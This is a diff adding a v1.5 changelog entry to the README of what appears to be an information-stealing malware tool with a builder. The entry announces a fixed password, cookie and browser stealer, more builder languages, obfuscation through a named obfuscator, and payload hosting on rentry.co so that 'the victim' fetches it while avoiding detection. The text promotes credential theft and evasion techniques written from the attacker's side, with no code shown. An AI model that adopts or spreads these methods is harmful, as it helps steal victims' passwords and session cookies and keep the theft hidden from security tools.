@@ -60,6 +60,14 @@ If it does not work, install microsoft visual c++ redistributable and python 3.1
 ## <a id="changelog"></a>🌟 〢 ChangeLog
 
 ```diff
+
+v1.5 ⋮ 2024-10-7
++ Password, cookies, browsers stealer fixed.
++ More languages were added to the builder, we now have Spanish, English, Russian, and Chinese.
++ Obfuscation has been added using the technology from https://github.com/Lawxsz/Py-obfuscator
++ Now the code is uploaded to rentry.co, and the victim retrieves it from there, thus evading more detections and making it more optimized.
+
+
 v1.4 ⋮ 2024-10-4
 
 + Telegram Logs Added
